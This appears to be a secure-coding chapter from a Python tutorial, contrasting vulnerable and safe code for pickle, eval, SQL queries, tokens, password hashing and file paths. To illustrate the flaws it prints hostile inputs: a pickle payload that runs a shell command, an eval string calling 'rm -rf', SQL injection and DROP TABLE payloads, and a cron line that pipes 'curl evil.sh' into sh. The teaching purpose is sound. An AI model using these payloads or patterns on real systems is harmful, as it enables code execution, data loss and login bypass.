# 27 — Security

## `pickle`: Deserialization Is Arbitrary Code Execution

::code-wrapper{language="python"}
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("echo pwned > /tmp/pwned.txt",))

payload = pickle.dumps(Exploit())

# Anyone who unpickles this payload runs os.system(...) with NO warning, NO sandbox:
pickle.loads(payload)   # /tmp/pwned.txt now exists — arbitrary shell command executed
```
::

`pickle.loads` does not merely parse data — the pickle protocol can embed instructions to reconstruct arbitrary objects via `__reduce__`, and Python happily calls whatever callable that method specifies, with whatever arguments it specifies, during deserialization. This is not a bug or an edge case; it is the pickle protocol's designed behavior, which is precisely why **the Python documentation explicitly warns**: never unpickle data from an untrusted or unauthenticated source. A pickle payload is equivalent, in trust terms, to a script you're about to execute.

::code-wrapper{language="python"}
```python
# WRONG — accepting pickled data from a network client, a cache, or a message queue
# populated by anything an attacker could influence
import pickle

def handle_request(raw_bytes):
    data = pickle.loads(raw_bytes)   # if raw_bytes came from an untrusted client, this is RCE
    return process(data)

# RIGHT — use a format with no code-execution capability for anything crossing a trust boundary
import json

def handle_request(raw_bytes):
    data = json.loads(raw_bytes)     # JSON deserialization can only produce dict/list/str/int/float/bool/None
    return process(data)
```
::

**Best practice**: use `json` (or `msgpack`, `protobuf`) for any data crossing a trust boundary — network requests, message queues, user-uploaded files, third-party APIs. Reserve `pickle` strictly for trusted, internal, same-application data (caching your own computed objects between runs of your own trusted code) where no attacker-influenced bytes are ever fed into `pickle.loads`. If a signed guarantee of authenticity is needed for internal pickle use, HMAC-sign the payload and verify the signature *before* calling `pickle.loads`, never after.

## `eval` and `exec`: Executing Strings as Code

::code-wrapper{language="python"}
```python
# WRONG — a "simple calculator" that evaluates user-supplied expressions
def calculate(expression):
    return eval(expression)

calculate("2 + 2")                                        # 4 — looks harmless
calculate("__import__('os').system('rm -rf /tmp/data')")   # arbitrary shell command — eval() has NO sandbox
```
::

`eval()` compiles and executes an arbitrary Python expression string with the full power of the interpreter — there is no meaningful way to "sandbox" it against a determined attacker, since Python's introspection (`__import__`, `__class__.__bases__`, `__subclasses__()`) provides many paths back to unrestricted code execution even after naive blocklisting attempts. Restricting `eval`'s `globals`/`locals` arguments (`eval(expr, {"__builtins__": {}})`) raises the bar slightly but is a well-documented, frequently-bypassed non-solution, not a real security boundary.

::code-wrapper{language="python"}
```python
# RIGHT — use ast.literal_eval for the "parse a literal" use case; it CANNOT execute arbitrary code
import ast

ast.literal_eval("2 + 2")               # ValueError — NOT a literal, refuses on purpose
ast.literal_eval("[1, 2, 3]")           # [1, 2, 3] — safe, only parses literal Python data structures
ast.literal_eval("{'a': 1, 'b': 2}")    # {'a': 1, 'b': 2}
# ast.literal_eval("__import__('os')")   # ValueError — refuses anything beyond literals, no code execution path
```
::

::code-wrapper{language="python"}
```python
# RIGHT — for the "evaluate a math expression" use case, use a real expression parser/evaluator
import operator

_OPERATORS = {"+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.truediv}

def safe_calculate(a, op, b):
    if op not in _OPERATORS:
        raise ValueError(f"unsupported operator: {op}")
    return _OPERATORS[op](a, b)
```
::

**Best practice**: `eval`/`exec` should never appear in code that processes any input originating from a user, a network request, a config file editable by a lower-trust actor, or anything resembling untrusted data. `ast.literal_eval` covers the "parse a Python-literal string safely" use case; a purpose-built parser (or a library like `asteval`, `simpleeval`, or a proper expression-grammar parser) covers "evaluate a restricted expression language" — neither requires the interpreter's full, unrestricted `eval`.

## SQL Injection: String Formatting vs Parameterized Queries

::code-wrapper{language="python"}
```python
import sqlite3

conn = sqlite3.connect("app.db")
cursor = conn.cursor()

# WRONG — building SQL via string formatting/concatenation
def get_user_wrong(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return cursor.execute(query).fetchone()

# an attacker-supplied username of:  ' OR '1'='1
# produces:  SELECT * FROM users WHERE username = '' OR '1'='1'
# which matches EVERY ROW in the table, bypassing the intended filter entirely
get_user_wrong("' OR '1'='1")

# a more destructive payload:  '; DROP TABLE users; --
# produces a second, attacker-controlled STATEMENT appended to the original query
```
::

::code-wrapper{language="python"}
```python
# RIGHT — parameterized query: the driver sends the SQL and the data SEPARATELY,
# so user input can never be interpreted as SQL syntax, no matter what it contains
def get_user_correct(username):
    query = "SELECT * FROM users WHERE username = ?"
    return cursor.execute(query, (username,)).fetchone()

get_user_correct("' OR '1'='1")   # safely matches ZERO rows — treated as a literal, oddly-named username
```
::

String-formatting a value directly into a SQL query means the database cannot distinguish "data the query is filtering by" from "syntax that changes what the query does" — any quote character in attacker-controlled input can terminate the intended string literal early and inject new SQL. A parameterized query (`?` placeholders in `sqlite3`, `%s` in `psycopg2`, named placeholders in most ORMs) sends the query template and the values as two separate pieces to the database driver, which substitutes values as literal data at the protocol level — no string ever gets reinterpreted as SQL syntax, regardless of its content. **This is not a "best practice, when convenient" recommendation — it is the only correct way to build a SQL query containing any external input, full stop.**

::code-wrapper{language="python"}
```python
# WRONG — an ORM does not automatically protect against injection if raw SQL fragments are used
from sqlalchemy import text

def search_wrong(engine, column_name, value):
    query = text(f"SELECT * FROM products WHERE {column_name} = :value")   # column_name is INTERPOLATED
    return engine.execute(query, {"value": value})   # value is parameterized, but column_name is NOT

# RIGHT — validate identifiers (column/table names) against a strict allowlist,
# since placeholders can only parameterize VALUES, never identifiers like column/table names
_ALLOWED_COLUMNS = {"name", "price", "category"}

def search_correct(engine, column_name, value):
    if column_name not in _ALLOWED_COLUMNS:
        raise ValueError(f"invalid column: {column_name}")
    query = text(f"SELECT * FROM products WHERE {column_name} = :value")
    return engine.execute(query, {"value": value})
```
::

**Critical distinction**: parameterized queries protect *values*, not *identifiers* — a column name, table name, or `ORDER BY` direction can never be passed as a bind parameter (SQL syntax doesn't allow it), so any query that needs a dynamic identifier must validate it against a strict allowlist of known-safe names before interpolating it into the query string.

## The `secrets` Module: Cryptographically Secure Randomness

::code-wrapper{language="python"}
```python
import random
import secrets

# WRONG — random.random()/random.randint() use a Mersenne Twister PRNG,
# which is fast and great for simulations/games, but its output is PREDICTABLE
# if an attacker observes enough outputs — never use it for security-sensitive values
weak_token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=32))

# RIGHT — secrets uses the OS's cryptographically secure random source
strong_token = secrets.token_urlsafe(32)      # URL-safe, base64-based token
strong_hex = secrets.token_hex(32)              # hex-encoded token
api_key = secrets.token_bytes(32)                 # raw bytes, when a specific encoding isn't needed
```
::

`random`'s default generator (Mersenne Twister) is deterministic and, given enough observed outputs, its internal state — and therefore all future outputs — can be reconstructed by an attacker; it was never designed to resist this kind of analysis, only to have good *statistical* randomness for simulations. `secrets` draws from the operating system's CSPRNG (`os.urandom` under the hood), specifically designed to be unpredictable even to an attacker who can observe many outputs. **Best practice**: any token used for a security purpose — session IDs, password-reset tokens, API keys, CSRF tokens — must use `secrets`, never `random`, with zero exceptions.

::code-wrapper{language="python"}
```python
import secrets

# WRONG — comparing secrets with == is vulnerable to a TIMING ATTACK:
# Python's == on strings short-circuits at the FIRST mismatched character,
# so comparison time leaks how many leading characters were correct
def check_token_wrong(provided, expected):
    return provided == expected

# RIGHT — constant-time comparison, takes the same time regardless of WHERE strings differ
def check_token_correct(provided, expected):
    return secrets.compare_digest(provided, expected)
```
::

A naive `==` string comparison returns as soon as it finds a mismatched character, so measuring response time across many attempts can reveal, one character at a time, how many leading characters of a guessed token were correct — a real, exploitable attack against network-facing comparisons (not just a theoretical concern). `secrets.compare_digest` always compares the full length of both inputs in constant time, leaking no timing information regardless of where (or whether) the strings differ.

## Password Hashing: Never Store Plaintext, Never Use Fast Hashes

::code-wrapper{language="python"}
```python
import hashlib

# WRONG — MD5/SHA-256 are FAST hashes, designed for speed — the opposite of what password
# storage needs; fast hashes let an attacker with a stolen database try billions of
# guesses per second on commodity GPU hardware
def hash_password_wrong(password):
    return hashlib.sha256(password.encode()).hexdigest()

# RIGHT — a purpose-built password hash: slow by design, with built-in salting
import bcrypt

def hash_password_correct(password):
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt())

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode(), hashed)
```
::

General-purpose cryptographic hashes (`SHA-256`, `MD5`) are engineered to be *fast*, which is exactly the wrong property for password storage — an attacker who steals a database of SHA-256 password hashes can attempt billions of candidate passwords per second against them using ordinary GPU hardware. `bcrypt` (and `argon2`, `scrypt`) are deliberately slow, tunable, and include automatic per-password salting, making brute-force and rainbow-table attacks computationally infeasible at scale even after a full database breach. **Best practice**: never write custom password-hashing code; use a maintained, purpose-built library (`bcrypt`, `argon2-cffi`, or Django's/Flask's built-in password hashers) — this is one of the few areas of programming where "don't roll your own" is close to an absolute rule.

## Dependency Vulnerabilities

::code-wrapper{language="bash"}
```bash
pip install pip-audit
pip-audit
# Found 2 known vulnerabilities in 1 package
# Name     Version ID                  Fix Versions
# -------- ------- ------------------- ------------
# requests 2.6.0   PYSEC-2018-28       2.20.0

uv pip audit                    # uv has a built-in equivalent
```
::

Every third-party dependency is code the application trusts to run with its own privileges — a vulnerability in a deeply nested transitive dependency (one the application's authors may not even know is installed) is exactly as exploitable as a vulnerability in code the team wrote itself. `pip-audit` (backed by the Python Packaging Advisory Database and OSV) cross-references installed package versions against known CVEs. **Best practice**: run a dependency audit in CI on every build, not just periodically by hand — a dependency that was safe when first installed can become vulnerable the day a new CVE is published against it, with no code change on the project's own side.

::code-wrapper{language="yaml"}
```yaml
# .github/workflows/security.yml — run dependency audits automatically on every push
name: security
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install pip-audit
      - run: pip-audit
```
::

## Path Traversal and Untrusted File Paths

::code-wrapper{language="python"}
```python
import os
from pathlib import Path

UPLOAD_DIR = Path("/var/app/uploads")

# WRONG — naively joining user input into a path
def save_upload_wrong(filename, content):
    path = UPLOAD_DIR / filename
    path.write_bytes(content)

# an attacker-supplied filename of "../../etc/cron.d/malicious" ESCAPES the upload directory entirely
save_upload_wrong("../../etc/cron.d/malicious", b"* * * * * root curl evil.sh | sh")

# RIGHT — resolve the final path and verify it's still WITHIN the intended directory
def save_upload_correct(filename, content):
    candidate = (UPLOAD_DIR / filename).resolve()
    if not candidate.is_relative_to(UPLOAD_DIR.resolve()):
        raise ValueError("path traversal attempt detected")
    candidate.write_bytes(content)
```
::

`pathlib`'s `/` operator (and `os.path.join`) performs no safety checking — a path component containing `../` segments happily walks back up out of the intended base directory, and Python will follow it. `Path.resolve()` normalizes the path (collapsing `..` segments), and `Path.is_relative_to()` (Python 3.9+) verifies the resolved result is still contained within the expected root directory before any file operation touches disk. **Best practice**: any file path built even partially from user input — uploaded filenames, URL path segments, archive member names during extraction (a related, equally common vulnerability class in `zipfile`/`tarfile` handling) — must be validated to stay within its intended directory before use.

## 💡 Tips & Tricks

- **Safety**: `bandit` (`pip install bandit && bandit -r src/`) statically scans Python source for common security anti-patterns — hardcoded passwords, `eval` usage, insecure `random` for security contexts, `subprocess` calls with `shell=True` — catching many of this chapter's mistakes automatically in CI before code review even starts.
- **Debug**: `python -c "import ssl; print(ssl.OPENSSL_VERSION)"` quickly confirms which OpenSSL version a Python installation is linked against — relevant when diagnosing TLS-related CVEs that depend on the underlying OpenSSL version rather than Python itself.
- **Idiom**: prefer `subprocess.run([...], shell=False)` (the default) with an argument list over `shell=True` with a formatted string — the list form never invokes a shell to interpret the arguments, closing off an entire class of shell-injection vulnerabilities analogous to SQL injection.
- **Safety**: `secrets.token_urlsafe()` defaults to 32 bytes of entropy if no argument is given — a reasonable default for most tokens, but check the specific security requirement (session tokens vs short-lived one-time codes) rather than assuming the default fits every case.
- **Performance**: `bcrypt`'s cost factor (`bcrypt.gensalt(rounds=12)`, default 12) should be tuned periodically upward as hardware gets faster — the goal is that hashing remains "slow enough to resist brute force" relative to *current* attacker hardware, not whatever was fast/slow when the code was first written.

## ⚠️ Edge Cases & Gotchas

- **`pickle.loads` executes attacker-controlled code via `__reduce__` with no warning, no exception, and no sandboxing** — this applies to any pickle-based mechanism, including some caching libraries, some message queues' default serializers, and `multiprocessing`'s default IPC serialization, all of which are safe only because the *inputs* are trusted, not because pickle itself is safe.
- **`ast.literal_eval` still parses arbitrarily large or deeply nested literals, which can be used for a denial-of-service via resource exhaustion** (a deeply nested list literal can cause significant recursion/memory use) even though it can't achieve code execution — "safe from RCE" is not the same as "safe from all abuse."
- **Parameterized queries protect values but never identifiers (table names, column names, `ORDER BY` direction)** — attempting to pass a column name as a bind parameter either raises an error or silently does the wrong thing depending on the driver, and the only correct fix is allowlisting valid identifiers before string-interpolating them.
- **`secrets.compare_digest` requires both arguments to be the same type (both `str` or both `bytes`) and, for meaningful protection, both must be the same length as what a real value would be** — comparing a `bytes` token against a `str` expected value raises `TypeError` rather than silently doing the wrong (fast, timing-leaky) comparison, which is a safety feature but can surprise developers used to Python's usually-permissive type coercion.
- **A dependency audit only catches *known, published* vulnerabilities (CVEs) — a zero-day or an intentionally malicious package (a supply-chain attack via typosquatting or a compromised maintainer account) passes a clean audit with zero findings** — audits are necessary but not sufficient; pinning exact versions via a lockfile and reviewing new/unusual transitive dependencies before adding them are complementary defenses.

## 🧠 Spot the Bug

A login endpoint checks credentials against the database. It "works" in testing but a security review flags it immediately. Find the bug.

::code-wrapper{language="python"}
```python
import sqlite3

def login(username, password):
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    query = f"SELECT id FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    return cursor.fetchone() is not None
```
::

<details>
<summary>Answer</summary>

Two separate, serious bugs. First, the query is built with an f-string, directly interpolating both `username` and `password` into the SQL text — a classic SQL injection vulnerability. Supplying a username of `' OR '1'='1' --` makes the query become `SELECT id FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`, where `--` comments out the rest of the line, matching the first row in the table and logging in as an arbitrary user with no valid password at all.

Second, even ignoring the injection, the query implies passwords are stored and compared as **plaintext** in the `users` table — there's no hashing step anywhere, meaning a single database breach exposes every user's real password directly, and those same passwords are frequently reused across other services by real users.

The fix addresses both issues independently:
::code-wrapper{language="python"}
```python
import sqlite3
import bcrypt

def login(username, password):
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    cursor.execute("SELECT id, password_hash FROM users WHERE username = ?", (username,))
    row = cursor.fetchone()
    if row is None:
        return False
    user_id, password_hash = row
    return bcrypt.checkpw(password.encode(), password_hash)
```
::

**The lesson**: authentication code has two independent, equally critical security properties to get right — the query construction (parameterized, never string-formatted) and the credential storage (hashed with a slow, purpose-built algorithm, never plaintext or a fast general-purpose hash) — and a security review checks both, since fixing only one still leaves a critical vulnerability in production.

</details>

## Key Takeaways

- `pickle.loads` can execute arbitrary code via `__reduce__` — never unpickle data from an untrusted source; use `json` or another data-only format for anything crossing a trust boundary.
- `eval`/`exec` have no real sandbox against a determined attacker — use `ast.literal_eval` for parsing literals and a purpose-built parser/evaluator for restricted expression languages.
- SQL queries must use parameterized placeholders for every value derived from external input, with zero exceptions — string formatting/concatenation into SQL is the textbook SQL injection vulnerability; identifiers (column/table names) need allowlist validation instead, since they can't be parameterized.
- Use `secrets`, never `random`, for anything security-sensitive (tokens, keys, reset codes), and `secrets.compare_digest` for comparing them, to avoid both predictable-PRNG and timing-attack vulnerabilities.
- Hash passwords with a slow, purpose-built algorithm (`bcrypt`, `argon2`) — fast general-purpose hashes like SHA-256 make large-scale offline brute-forcing feasible after a database breach.
- Run automated dependency audits (`pip-audit`) in CI, and validate any user-influenced file path stays within its intended directory before touching disk — both are cheap, high-leverage defenses against entire vulnerability classes.
